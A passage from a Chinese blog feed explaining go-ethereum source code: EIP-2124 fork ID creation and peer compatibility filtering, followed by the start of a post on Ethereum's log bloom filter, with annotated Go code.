的依据</h3><p>首先定义远程节点和本地节点之间不兼容的情况。一种是远程节点的检验和是本地的子集，说明远程节点还没升级，不兼容。另一种是远程节点的校验和不匹配，说明它的分叉顺序、链配置、创世区块配置与本地不兼容。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line"><span class="comment">// ErrRemoteStale is returned by the validator if a remote fork checksum is a</span></span><br><span class="line"><span class="comment">// subset of our already applied forks, but the announced next fork block is</span></span><br><span class="line"><span class="comment">// not on our already passed chain.</span></span><br><span class="line">ErrRemoteStale = errors.New(<span class="string">&quot;remote needs update&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ErrLocalIncompatibleOrStale is returned by the validator if a remote fork</span></span><br><span class="line"><span class="comment">// checksum does not match any local checksum variation, signalling that the</span></span><br><span class="line"><span class="comment">// two chains have diverged in the past at some point (possibly at genesis).</span></span><br><span class="line">ErrLocalIncompatibleOrStale = errors.New(<span class="string">&quot;local incompatible or needs update&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>为了传递信息，定义了链配置、创世区块配置和当前区块头的接口。然后定义了 <code>ID</code> 包括了前面提到的 <code>FORK_HASH</code> 和 <code>FORK_NEXT</code>，最后定义了判断是否兼容的函数 <code>Filter</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Blockchain defines all necessary method to build a forkID.</span></span><br><span class="line"><span class="keyword">type</span> Blockchain <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="comment">// Config retrieves the chain&#x27;s fork configuration.</span></span><br><span class="line">Config() *params.ChainConfig</span><br><span class="line"></span><br><span class="line"><span class="comment">// Genesis retrieves the chain&#x27;s genesis block.</span></span><br><span class="line">Genesis() *types.Block</span><br><span class="line"></span><br><span class="line"><span class="comment">// CurrentHeader retrieves the current head header of the canonical chain.</span></span><br><span class="line">CurrentHeader() *types.Header</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ID is a fork identifier as defined by EIP-2124.</span></span><br><span class="line"><span class="keyword">type</span> ID <span class="keyword">struct</span> &#123;</span><br><span class="line">Hash [<span class="number">4</span>]<span class="type">byte</span> <span class="comment">// CRC32 checksum of the genesis block and passed fork block numbers</span></span><br><span class="line">Next <span class="type">uint64</span>  <span class="comment">// Block number of the next upcoming fork, or 0 if no forks are known</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Filter is a fork id filter to validate a remotely advertised ID.</span></span><br><span class="line"><span class="keyword">type</span> Filter <span class="function"><span class="keyword">func</span><span class="params">(id ID)</span></span> <span class="type">error</span></span><br></pre></td></tr></table></figure><h3 id="创建-ID-标识">创建 ID 标识</h3><p>节点根据对方的 ID 的内容，选择是否连接。从链配置、创世区块哈希、当前分叉区块高度获取节点的标识</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewID calculates the Ethereum fork ID from the chain config, genesis hash, and head.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewID</span><span class="params">(config *params.ChainConfig, genesis common.Hash, head <span class="type">uint64</span>)</span></span> ID &#123;</span><br><span class="line"><span class="comment">// Calculate the starting checksum from the genesis hash</span></span><br><span class="line">hash := crc32.ChecksumIEEE(genesis[:]) <span class="comment">//计算创世区块校验和</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Calculate the current fork checksum and the next fork block</span></span><br><span class="line"><span class="keyword">var</span> next <span class="type">uint64</span></span><br><span class="line"><span class="keyword">for</span> _, fork := <span class="keyword">range</span> gatherForks(config) &#123;</span><br><span class="line"><span class="keyword">if</span> fork &lt;= head &#123;</span><br><span class="line"><span class="comment">// Fork already passed, checksum the previous hash and the fork number</span></span><br><span class="line">hash = checksumUpdate(hash, fork) <span class="comment">//将之前的分叉逐个添加进 fork_hash</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">next = fork <span class="comment">//如果超过了当前的分叉的区块高度，那么这是即将迎来的分叉。否则 next 为 0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ID&#123;Hash: checksumToBytes(hash), Next: next&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建过滤器">创建过滤器</h3><p>首先根据本地节点的配置，创建过滤器。然后输入远程节点的 ID，通过检查过滤器是否抛出不兼容的错误，就可以知道是否连接远程节点。</p><p>过滤规则详见 EIP-2124，本文前面提到过。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// newFilter is the internal version of NewFilter, taking closures as its arguments</span></span><br><span class="line"><span class="comment">// instead of a chain. The reason is to allow testing it without having to simulate</span></span><br><span class="line"><span class="comment">// an entire blockchain.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newFilter</span><span class="params">(config *params.ChainConfig, genesis common.Hash, headfn <span class="keyword">func</span>()</span></span> <span class="type">uint64</span>) Filter &#123;</span><br><span class="line"><span class="comment">// Calculate the all the valid fork hash and fork next combos</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line"><span class="comment">//各种分叉的区块高度</span></span><br><span class="line">forks = gatherForks(config)</span><br><span class="line"><span class="comment">//每个分叉的对应的累积校验和</span></span><br><span class="line">sums = <span class="built_in">make</span>([][<span class="number">4</span>]<span class="type">byte</span>, <span class="built_in">len</span>(forks)+<span class="number">1</span>) <span class="comment">// 0th is the genesis</span></span><br><span class="line">)</span><br><span class="line">hash := crc32.ChecksumIEEE(genesis[:])</span><br><span class="line">sums[<span class="number">0</span>] = checksumToBytes(hash)</span><br><span class="line"></span><br><span class="line"><span class="comment">//整合校验和</span></span><br><span class="line"><span class="keyword">for</span> i, fork := <span class="keyword">range</span> forks &#123;</span><br><span class="line">hash = checksumUpdate(hash, fork)</span><br><span class="line">sums[i+<span class="number">1</span>] = checksumToBytes(hash)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最后一个位置作为 &quot;哨兵&quot;，用于方便处理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Add two sentries to simplify the fork checks and don&#x27;t require special</span></span><br><span class="line"><span class="comment">// casing the last one.</span></span><br><span class="line">forks = <span class="built_in">append</span>(forks, math.MaxUint64) <span class="comment">// Last fork will never be passed</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a validator that will filter out incompatible chains</span></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(id ID)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="comment">// Run the fork checksum validation ruleset:</span></span><br><span class="line"><span class="comment">//   1. If local and remote FORK_CSUM matches, compare local head to FORK_NEXT.</span></span><br><span class="line"><span class="comment">//        The two nodes are in the same fork state currently. They might know</span></span><br><span class="line"><span class="comment">//        of differing future forks, but that&#x27;s not relevant until the fork</span></span><br><span class="line"><span class="comment">//        triggers (might be postponed, nodes might be updated to match).</span></span><br><span class="line"><span class="comment">//      1a. A remotely announced but remotely not passed block is already passed</span></span><br><span class="line"><span class="comment">//          locally, disconnect, since the chains are incompatible.</span></span><br><span class="line"><span class="comment">//      1b. No remotely announced fork; or not yet passed locally, connect.</span></span><br><span class="line"><span class="comment">//   2. If the remote FORK_CSUM is a subset of the local past forks and the</span></span><br><span class="line"><span class="comment">//      remote FORK_NEXT matches with the locally following fork block number,</span></span><br><span class="line"><span class="comment">//      connect.</span></span><br><span class="line"><span class="comment">//        Remote node is currently syncing. It might eventually diverge from</span></span><br><span class="line"><span class="comment">//        us, but at this current point in time we don&#x27;t have enough information.</span></span><br><span class="line"><span class="comment">//   3. If the remote FORK_CSUM is a superset of the local past forks and can</span></span><br><span class="line"><span class="comment">//      be completed with locally known future forks, connect.</span></span><br><span class="line"><span class="comment">//        Local node is currently syncing. It might eventually diverge from</span></span><br><span class="line"><span class="comment">//        the remote, but at this current point in time we don&#x27;t have enough</span></span><br><span class="line"><span class="comment">//        information.</span></span><br><span class="line"><span class="comment">//   4. Reject in all other cases.</span></span><br><span class="line">head := headfn()</span><br><span class="line"><span class="keyword">for</span> i, fork := <span class="keyword">range</span> forks &#123;</span><br><span class="line"><span class="comment">//如果当前区块高度超过了某个分叉，就继续往后检查。前面设置的哨兵的作用就是在这里跳过这个检查</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// If our head is beyond this fork, continue to the next (we have a dummy</span></span><br><span class="line"><span class="comment">// fork of maxuint64 as the last item to always fail this check eventually).</span></span><br><span class="line"><span class="keyword">if</span> head &gt;= fork &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//达到了本地节点的下一个分叉区块高度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Found the first unpassed fork block, check if our current state matches</span></span><br><span class="line"><span class="comment">// the remote checksum (rule #1).</span></span><br><span class="line"><span class="keyword">if</span> sums[i] == id.Hash &#123; <span class="comment">//如果匹配</span></span><br><span class="line"><span class="comment">// Fork checksum matched, check if a remote future fork block already passed</span></span><br><span class="line"><span class="comment">// locally without the local node being aware of it (rule #1a).</span></span><br><span class="line"><span class="keyword">if</span> id.Next &gt; <span class="number">0</span> &amp;&amp; head &gt;= id.Next &#123;</span><br><span class="line"><span class="comment">//但是当前区块高度高于远程节点的下一个分叉高度，那么不兼容</span></span><br><span class="line"><span class="keyword">return</span> ErrLocalIncompatibleOrStale</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Haven&#x27;t passed locally a remote-only fork, accept the connection (rule #1b).</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//开始部分匹配。远程节点与本地节点处于不同的分叉状态，这是要求远程节点在本地节点“之前”,</span></span><br><span class="line"><span class="comment">//表现出来是远程节点的校验和是本地节点的子集</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The local and remote nodes are in different forks currently, check if the</span></span><br><span class="line"><span class="comment">// remote checksum is a subset of our local forks (rule #2).</span></span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; i; j++ &#123;</span><br><span class="line"><span class="comment">//找子集的匹配部分，并且要求远程节点接着的分叉与本地节点对应</span></span><br><span class="line"><span class="keyword">if</span> sums[j] == id.Hash &#123;</span><br><span class="line"><span class="comment">// Remote checksum is a subset, validate based on the announced next fork</span></span><br><span class="line"><span class="keyword">if</span> forks[j] != id.Next &#123;</span><br><span class="line"><span class="keyword">return</span> ErrRemoteStale</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果远程节点包括了当前节点的所有分叉，那么可以连接，告诉远程节点，当前节点没有完成同步</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Remote chain is not a subset of our local one, check if it&#x27;s a superset by</span></span><br><span class="line"><span class="comment">// any chance, signalling that we&#x27;re simply out of sync (rule #3).</span></span><br><span class="line"><span class="keyword">for</span> j := i + <span class="number">1</span>; j &lt; <span class="built_in">len</span>(sums); j++ &#123;</span><br><span class="line"><span class="keyword">if</span> sums[j] == id.Hash &#123;</span><br><span class="line"><span class="comment">// Yay, remote checksum is a superset, ignore upcoming forks</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// No exact, subset or superset match. We are on differing chains, reject.</span></span><br><span class="line"><span class="keyword">return</span> ErrLocalIncompatibleOrStale</span><br><span class="line">&#125;</span><br><span class="line">log.Error(<span class="string">&quot;Impossible fork ID validation&quot;</span>, <span class="string">&quot;id&quot;</span>, id)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span> <span class="comment">// Something&#x27;s very wrong, accept rather than reject</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="提取分叉高度">提取分叉高度</h3><p>从上面过滤器的规则可以看出，它主要根据分叉的高度来判断是否兼容。以下的函数用于从链配置中提取分叉高度。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gatherForks gathers all the known forks and creates a sorted list out of them.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gatherForks</span><span class="params">(config *params.ChainConfig)</span></span> []<span class="type">uint64</span> &#123;</span><br><span class="line">   <span class="comment">// Gather all the fork block numbers via reflection</span></span><br><span class="line">   kind := reflect.TypeOf(params.ChainConfig&#123;&#125;)</span><br><span class="line">   conf := reflect.ValueOf(config).Elem()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> forks []<span class="type">uint64</span></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; kind.NumField(); i++ &#123;</span><br><span class="line">      <span class="comment">// Fetch the next field and skip non-fork rules</span></span><br><span class="line">      field := kind.Field(i)</span><br><span class="line"></span><br><span class="line">      <span class="comment">//处理链配置中的分叉区块，因为它们末尾都是 Block，而且都是 bigInt 类型</span></span><br><span class="line">      <span class="keyword">if</span> !strings.HasSuffix(field.Name, <span class="string">&quot;Block&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> field.Type != reflect.TypeOf(<span class="built_in">new</span>(big.Int)) &#123;</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Extract the fork rule block number and aggregate it</span></span><br><span class="line">      rule := conf.Field(i).Interface().(*big.Int)</span><br><span class="line">      <span class="keyword">if</span> rule != <span class="literal">nil</span> &#123;</span><br><span class="line">         forks = <span class="built_in">append</span>(forks, rule.Uint64())</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//数据量很小，冒泡排序也不差，区块高度需要按升序，表达分叉顺序</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Sort the fork block numbers to permit chronological XOR</span></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(forks); i++ &#123;</span><br><span class="line">      <span class="keyword">for</span> j := i + <span class="number">1</span>; j &lt; <span class="built_in">len</span>(forks); j++ &#123;</span><br><span class="line">         <span class="keyword">if</span> forks[i] &gt; forks[j] &#123;</span><br><span class="line">            forks[i], forks[j] = forks[j], forks[i]</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//处理同一个区块高度多个分叉的情况，删除前面的重复的分叉。这种情况几乎不会发生。</span></span><br><span class="line">   <span class="comment">//如A、B、C 的分叉高度都是 1000，那么删除 A、B对应的区块高度。</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Deduplicate block numbers applying multiple forks</span></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="built_in">len</span>(forks); i++ &#123;</span><br><span class="line">      <span class="keyword">if</span> forks[i] == forks[i<span class="number">-1</span>] &#123;</span><br><span class="line">         forks = <span class="built_in">append</span>(forks[:i], forks[i+<span class="number">1</span>:]...)</span><br><span class="line">         i--</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//跳过高度为 0 的分叉，因为它是写在创世区块的配置里。</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Skip any forks in block 0, that&#x27;s the genesis ruleset</span></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(forks) &gt; <span class="number">0</span> &amp;&amp; forks[<span class="number">0</span>] == <span class="number">0</span> &#123;</span><br><span class="line">      forks = forks[<span class="number">1</span>:]</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> forks</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/geth/tx-signature/&quot; title=&quot;交易的签名&quot;&gt;交易的签名&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-receipt/&quot; title=&quot;理解收据receipt&quot;&gt;理解收据receipt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blocks/&quot; title=&quot;理解区块&quot;&gt;理解区块&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/understand-tx/&quot; title=&quot;理解交易&quot;&gt;理解交易&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/blockchain-core/&quot; title=&quot;blockchain核心&quot;&gt;blockchain核心&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/forkId/&quot; title=&quot;forkId 解读&quot;&gt;forkId 解读&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/geth/bloom-filter/&quot; title=&quot;布隆过滤器原理&quot;&gt;布隆过滤器原理&lt;/a&gt;&lt;</summary>
        
      
    
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/categories/geth/"/>
    
    
    <category term="geth" scheme="https://www.blog-blockchain.xyz/tags/geth/"/>
    
  </entry>
  
  <entry>
    <title>布隆过滤器原理</title>
    <link href="https://www.blog-blockchain.xyz/geth/bloom-filter/"/>
    <id>https://www.blog-blockchain.xyz/geth/bloom-filter/</id>
    <published>2022-08-25T03:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.924Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><h2 id="介绍">介绍</h2><blockquote><p><strong>布隆过滤器</strong>（英语：Bloom Filter）是 1970 年由布隆提出的。它实际上是一个很长的二进制向量和一系列随机映射函数。布隆过滤器可以用于<strong>检索一个元素是否在一个集合中</strong>。它的优点是空间效率和查询时间都远远超过一般的算法，缺点是有一定的误识别率和删除困难。</p></blockquote><p>可见，它解决的核心问题是 <strong>检索一个元素是否在一个集合中</strong>。原理大致如下：</p><p>当一个元素被加入集合时，通过 K 个散列函数将这个元素映射成一个二进制数组中的 K 个位置，把这些位置的值设置为 1。检索时，我们只要观察这些对应的位置的值是不是都是 1 就（大约）知道集合中有没有检索的元素：如果这 K 个位置中有任何一个 0，则被检索元素一定不在集合中；如果都是 1，则被检元素很可能在。这就是布隆过滤器的基本思想。有个<a href="https://llimllib.github.io/bloomfilter-tutorial/zh_CN/">在线网站</a>可以玩耍。</p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/Bloom_filter.svg/360px-Bloom_filter.svg.png" alt="img" style="zoom:150%;" /><h2 id="以太坊如何使用布隆过滤器">以太坊如何使用布隆过滤器</h2><p>事件是以太坊给外部应用程序发送消息的重要方式，应用为了获取自己需要的信息，需要在许多事件中快速的检索。虽然把数据都写入存储，依靠存储中的哈希索引，可以快速检索，但是以太坊的存储空间的计算代价很高，不可能用来存储大量的交易日志、事件等重复性很高的信息。布隆过滤器就是用来解决快速检索的问题。</p><p>当生成区块时，布隆过滤器中包含触发事件的合约的地址、事件中的 <code>indexed</code> 的字段。然后，布隆过滤器会包含在区块头中，同时实际日志和事件的数据不包含在区块中，只保留了日志和事件的检索方式。</p><p>外部的应用程序监听事件时，可以快速扫描区块头中的布隆过滤器，找到特定合约地址和其中的 <code>indexed</code> 字段，查找满足条件的事件。</p><h2 id="源码的实现与原理">源码的实现与原理</h2><h3 id="core-types-bloom9-go"><code>core/types/bloom9.go</code></h3><h4 id="布隆过滤器的定义">布隆过滤器的定义</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line"><span class="comment">// BloomByteLength represents the number of bytes used in a header log bloom.</span></span><br><span class="line">BloomByteLength = <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// BloomBitLength represents the number of bits used in a header log bloom.</span></span><br><span class="line">BloomBitLength = <span class="number">8</span> * BloomByteLength <span class="comment">//2048 位</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Bloom represents a 2048 bit bloom filter.</span></span><br><span class="line"><span class="keyword">type</span> Bloom [BloomByteLength]<span class="type">byte</span></span><br></pre></td></tr></table></figure><p>可见，2048 位作为一个区块头的布隆过滤器。</p><h4 id="添加元素">添加元素</h4><p>字节数组转换成布隆过滤器，从末尾开始数，替换布隆过滤器的 d 个字节。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BytesToBloom converts a byte slice to a bloom filter.</span></span><br><span class="line"><span class="comment">// It panics if b is not of suitable size.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BytesToBloom</span><span class="params">(b []<span class="type">byte</span>)</span></span> Bloom &#123;</span><br><span class="line"><span class="keyword">var</span> bloom Bloom</span><br><span class="line">bloom.SetBytes(b)</span><br><span class="line"><span class="keyword">return</span> bloom</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// SetBytes sets the content of b to the given bytes.</span></span><br><span class="line"><span class="comment">// It panics if d is not of suitable size.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Bloom)</span></span> SetBytes(d []<span class="type">byte</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(b) &lt; <span class="built_in">len</span>(d) &#123;</span><br><span class="line"><span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;bloom bytes too big %d %d&quot;</span>, <span class="built_in">len</span>(b), <span class="built_in">len</span>(d)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">copy</span>(b[BloomByteLength-<span class="built_in">len</span>(d):], d)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上，除了上面提到的替代字节的方法，也有真的类似于 <code>append</code> 的方法，叫做 <code>Add</code>，它实际上是选择 2048 位中的三个位置，置为 1。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add adds d to the filter. Future calls of Test(d) will return true.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Bloom)</span></span> Add(d []<span class="type">byte</span>) &#123;</span><br><span class="line">b.add(d, <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">6</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add is internal version of Add, which takes a scratch buffer for reuse (needs to be at least 6 bytes)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Bloom)</span></span> add(d []<span class="type">byte</span>, buf []<span class="type">byte</span>) &#123;</span><br><span class="line">i1, v1, i2, v2, i3, v3 := bloomValues(d, buf)</span><br><span class="line">b[i1] |= v1</span><br><span class="line">b[i2] |= v2</span><br><span class="line">b[i3] |= v3</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面出现了比较重要的函数 